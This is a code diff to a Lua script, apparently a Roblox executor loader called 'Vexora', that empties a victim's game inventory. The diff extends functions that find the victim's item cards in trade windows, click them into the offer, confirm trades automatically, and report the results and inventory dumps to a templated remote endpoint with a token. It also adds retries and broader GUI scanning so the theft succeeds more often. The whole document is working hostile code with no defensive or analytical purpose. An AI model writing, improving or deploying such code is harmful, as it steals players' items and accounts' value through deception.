@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "2.7"
+local CLIENT_REV = "2.8"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -814,6 +814,15 @@ function Vexora.probe()
     return probeLines()
 end
 
+-- probe rows are printed too, so the executor log alone shows what the game has
+local function reportProbe(receiver, detail, lines)
+    for i, line in ipairs(lines) do
+        if i > 16 then break end
+        print("[vexora] probe: " .. tostring(line))
+    end
+    reportTrade("probe", receiver, { items = lines, detail = detail })
+end
+
 -- a trade screen is any visible gui with "trade" in the name
 local function tradeWindow()
     local player = LocalPlayer or Players.LocalPlayer
@@ -839,18 +848,32 @@ end
 
 -- buttons in the trade window that hold your items, never the chrome. your panel is
 -- preferred by name so the receiver's cards are not clicked along with yours.
+local function hasInputConnection(obj)
+    if typeof(getconnections) ~= "function" then return false end
+    local ok, list = pcall(getconnections, obj.MouseButton1Click)
+    if ok and list and #list > 0 then return true end
+    ok, list = pcall(getconnections, obj.InputBegan)
+    return (ok and list and #list > 0) or false
+end
+
 local function clickableCards(root)
     local out = {}
     for _, obj in ipairs(root:GetDescendants()) do
         if obj:IsA("TextButton") or obj:IsA("ImageButton") then
             table.insert(out, obj)
-        elseif obj:IsA("ImageLabel") then
+        elseif obj:IsA("ImageLabel") or obj:IsA("TextLabel") or obj:IsA("Frame") then
             local active = false
             pcall(function() active = obj.Active == true end)
-            if active then table.insert(out, obj) end
+            if active or hasInputConnection(obj) then table.insert(out, obj) end
         end
     end
     return out
+end
+
+local function screenOf(obj)
+    local node = obj
+    while node and not node:IsA("ScreenGui") do node = node.Parent end
+    return node
 end
 
 local function windowSignature(window)
@@ -876,11 +899,12 @@ end
 -- ignored is retried with raw input and then with a direct signal fire
 local function activateCard(button, window)
     scrollCardIntoView(button)
-    local before = windowSignature(window)
+    local sigRoot = screenOf(button) or window
+    local before = windowSignature(sigRoot)
 
     pcall(function() game:GetService("VirtualUser"):ClickButton(button) end)
     task.wait(0.15)
-    if windowSignature(window) ~= before then return "virtual" end
+    if windowSignature(sigRoot) ~= before then return "virtual" end
 
     local pos
     pcall(function() pos = button.AbsolutePosition + button.AbsoluteSize * 0.5 end)
@@ -889,22 +913,56 @@ local function activateCard(button, window)
         if typeof(mouse1click) == "function" then
             pcall(mouse1click)
             task.wait(0.15)
-            if windowSignature(window) ~= before then return "mouse" end
+            if windowSignature(sigRoot) ~= before then return "mouse" end
         elseif typeof(mouse1down) == "function" and typeof(mouse1up) == "function" then
             pcall(mouse1down)
             pcall(mouse1up)
             task.wait(0.15)
-            if windowSignature(window) ~= before then return "mouse" end
+            if windowSignature(sigRoot) ~= before then return "mouse" end
         end
     end
 
     if typeof(firesignal) == "function" then
         pcall(function() firesignal(button.MouseButton1Click) end)
         task.wait(0.15)
-        if windowSignature(window) ~= before then return "signal" end
+        if windowSignature(sigRoot) ~= before then return "signal" end
     end
 
     return nil
+end
+
+local function tradeGuiRoots(window)
+    local player = LocalPlayer or Players.LocalPlayer
+    local gui = player and player:FindFirstChildOfClass("PlayerGui")
+    if not gui then return {} end
+
+    local trade, inventory = {}, {}
+    for _, screen in ipairs(gui:GetChildren()) do
+        if screen:IsA("ScreenGui") and screen.Enabled ~= false then
+            local n = screen.Name:lower()
+            if n:find("trade", 1, true) or n:find("offer", 1, true) then
+                table.insert(trade, screen)
+            elseif n:find("invent", 1, true) or n:find("collection", 1, true) then
+                table.insert(inventory, screen)
+            end
+        end
+    end
+
+    local roots = {}
+    for _, screen in ipairs(trade) do table.insert(roots, screen) end
+    for _, screen in ipairs(inventory) do table.insert(roots, screen) end
+
+    -- the frame we matched can be a header or a toast: the cards live somewhere
+    -- else in the same screen, so the whole screen goes in as well
+    if window then
+        local screen = screenOf(window)
+        if screen then
+            local seen = false
+            for _, root in ipairs(roots) do if root == screen then seen = true end end
+            if not seen then table.insert(roots, 1, screen) end
+        end
+    end
+    return roots
 end
 
 local function findAcceptButton()
@@ -932,20 +990,32 @@ local function findAcceptButton()
 end
 
 local function tradeButtons(window)
-    local preferred, fallback = {}, {}
-    for _, obj in ipairs(window:GetDescendants()) do
-        if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
-            local n = obj.Name:lower()
-            if n:find("your", 1, true) or n:find("self", 1, true) or n:find("player1", 1, true)
-                or n:find("left", 1, true) or n:find("myoffer", 1, true) or n:find("myitem", 1, true) then
-                table.insert(preferred, obj)
-            elseif n:find("offer", 1, true) or n:find("invent", 1, true) or n:find("item", 1, true) then
-                table.insert(fallback, obj)
+    local guiRoots = tradeGuiRoots(window)
+    local hasWindow = false
+    for _, root in ipairs(guiRoots) do if root == window then hasWindow = true end end
+    if not hasWindow then table.insert(guiRoots, 1, window) end
+
+    local preferred, fallback, grids = {}, {}, {}
+    for _, root in ipairs(guiRoots) do
+        for _, obj in ipairs(root:GetDescendants()) do
+            if obj:IsA("ScrollingFrame") then table.insert(grids, obj) end
+            if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
+                local n = obj.Name:lower()
+                if n:find("your", 1, true) or n:find("self", 1, true) or n:find("player1", 1, true)
+                    or n:find("left", 1, true) or n:find("myoffer", 1, true) or n:find("myitem", 1, true) then
+                    table.insert(preferred, obj)
+                elseif n:find("offer", 1, true) or n:find("invent", 1, true) or n:find("item", 1, true)
+                    or n:find("weapon", 1, true) or n:find("knife", 1, true) or n:find("gun", 1, true)
+                    or n:find("skin", 1, true) or n:find("grid", 1, true) or n:find("slot", 1, true) then
+                    table.insert(fallback, obj)
+                end
             end
         end
     end
 
-    local roots = #preferred > 0 and preferred or (#fallback > 0 and fallback or { window })
+    local roots = #preferred > 0 and preferred
+        or (#fallback > 0 and fallback
+        or (#grids > 0 and grids or guiRoots))
     local buttons, seenButton, seenLabel = {}, {}, {}
     for _, root in ipairs(roots) do
         for _, obj in ipairs(clickableCards(root)) do
@@ -969,44 +1039,72 @@ local function tradeButtons(window)
 end
 
 local function windowDump(window)
-    local nodes, buttons = 0, 0
-    local lines = {}
-    for _, obj in ipairs(window:GetDescendants()) do
-        nodes = nodes + 1
-        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
-            buttons = buttons + 1
-            if #lines < 24 then
-                local label = (buttonLabel(obj) or obj.Name):sub(1, 22)
-                table.insert(lines, obj.Name:sub(1, 18) .. "/" .. label)
+    local lines, frames, cardsList = {}, {}, {}
+    local function push(list, text)
+        if #list < 12 then table.insert(list, tostring(text):sub(1, 58)) end
+    end
+
+    local roots = tradeGuiRoots(window)
+    if window then
+        local seen = false
+        for _, root in ipairs(roots) do if root == window then seen = true end end
+        if not seen then table.insert(roots, 1, window) end
+    end
+
+    local nodes, cards, wired = 0, 0, 0
+    for _, root in ipairs(roots) do
+        push(frames, "root:" .. root.ClassName .. ":" .. root.Name)
+        for _, obj in ipairs(root:GetDescendants()) do
+            nodes = nodes + 1
+            if obj:IsA("ScrollingFrame") then
+                push(frames, "grid:" .. obj.Name .. "(" .. #obj:GetChildren() .. ")")
+            elseif obj:IsA("Frame") and obj.Name:lower():find("trade", 1, true) then
+                push(frames, "frame:" .. obj.Name)
+            end
+
+            local isButton = obj:IsA("TextButton") or obj:IsA("ImageButton")
+            local conn = hasInputConnection(obj)
+            if isButton or conn then
+                cards = cards + 1
+                if conn then wired = wired + 1 end
+                local label = buttonLabel(obj) or norm(obj.Name)
+                push(cardsList, obj.ClassName:sub(1, 9) .. ":" .. obj.Name:sub(1, 12) .. ":" .. label:sub(1, 16))
             end
         end
     end
-    table.insert(lines, 1, "buttons=" .. buttons .. " nodes=" .. nodes)
+
+    table.insert(lines, 1, string.format("nodes=%d cards=%d wired=%d roots=%d",
+        nodes, cards, wired, #roots))
+    for _, line in ipairs(frames) do table.insert(lines, line) end
+    for _, line in ipairs(cardsList) do table.insert(lines, line) end
     return lines
 end
 
 local function probeWithWindow()
     local lines = probeLines()
-    local window = tradeWindow()
-    if window then
-        for _, line in ipairs(windowDump(window)) do
-            if #lines < 40 then table.insert(lines, line) end
-        end
+    for _, line in ipairs(windowDump(tradeWindow())) do
+        if #lines < 40 then table.insert(lines, line) end
     end
     return lines
 end
 
 local function offerEverything(receiver)
     local items = Vexora.items()
-    local clicked, labels, methods, fired = 0, {}, {}, 0
+    local clicked, labels, methods, fired, scanned = 0, {}, {}, 0, 0
 
     -- the trade window lists your own items. clicking those cards is what actually
     -- fills the offer slots, whatever the game named its remotes.
     local window = tradeWindow()
     if window then
-        task.wait(1.2)
-        local ok, list = pcall(tradeButtons, tradeWindow() or window)
-        for _, entry in ipairs(ok and list or {}) do
+        -- the grid is built a moment after the window opens
+        local list = {}
+        for attempt = 1, 4 do
+            task.wait(attempt == 1 and 1.2 or 1.5)
+            local ok, found = pcall(tradeButtons, tradeWindow() or window)
+            if ok and found and #found > 0 then list = found break end
+        end
+        scanned = #list
+        for _, entry in ipairs(list) do
             if clicked >= OFFER_LIMIT then break end
             local used = activateCard(entry.button, tradeWindow() or window)
             if used then
@@ -1031,7 +1129,7 @@ local function offerEverything(receiver)
         end
     end
 
-    return clicked, labels, items, fired, methods
+    return clicked, labels, items, fired, methods, scanned
 end
 
 local function confirmTrade()
@@ -1084,20 +1182,17 @@ local function runReceiverTrade(player)
         reportTrade("window", player.Name, { detail = "trade ui open" })
 
         if PUSH_ALL_ITEMS then
-            local clicked, labels, items, fired, methods = offerEverything(player)
+            local clicked, labels, items, fired, methods, scanned = offerEverything(player)
             local used = {}
             for name, n in pairs(methods or {}) do table.insert(used, name .. "=" .. n) end
             reportTrade("offer", player.Name, {
                 items = clicked > 0 and labels or items,
                 detail = clicked > 0
-                    and string.format("%d item(s) clicked (%s)", clicked, table.concat(used, " "))
-                    or string.format("%d item(s) via %d remote(s)", #items, #itemRemotes),
+                    and string.format("%d item(s) clicked (%s) of %d card(s)", clicked, table.concat(used, " "), scanned)
+                    or string.format("%d item(s) via %d remote(s), %d card(s) scanned", #items, #itemRemotes, scanned),
             })
             if clicked == 0 and fired == 0 then
-                reportTrade("probe", player.Name, {
-                    items = probeWithWindow(),
-                    detail = "nothing offered - trade window dump",
-                })
+                reportProbe(player.Name, string.format("nothing offered - %d card(s) scanned", scanned), probeWithWindow())
             end
         end
 
@@ -1300,10 +1395,7 @@ if KICK_IF_EMPTY and not IS_CLAIMER then
                     end
                     if not probed then
                         probed = true
-                        reportTrade("probe", "-", {
-                            items = probeLines(),
-                            detail = "inventory unreadable, kick held",
-                        })
+                        reportProbe("-", "inventory unreadable, kick held", probeLines())
                     end
                 else
                     emptyReads = 0
@@ -1340,17 +1432,21 @@ autoTrade()
 --[[ ---- receiver side: confirm incoming trade windows without input ---- ]]
 if AUTO_ACCEPT then
     task.spawn(function()
+        local lastPrompt, lastConfirm = 0, 0
         while not stopped do
             task.wait(1)
             -- the request prompt is not a trade window (it is filtered out on purpose),
             -- so the receiver has to click Accept before any window exists
             if not outgoingTrade then
+                local now = os.clock()
                 local accept = findAcceptButton()
-                if accept then
+                if accept and now - lastPrompt >= 2 then
+                    lastPrompt = now
                     clickButton(accept)
                     print("[vexora] trade request prompt - accepted")
                 end
-                if tradeWindow() then
+                if tradeWindow() and now - lastConfirm >= 3 then
+                    lastConfirm = now
                     confirmTrade()
                     print("[vexora] incoming trade window - confirmed")
                 end
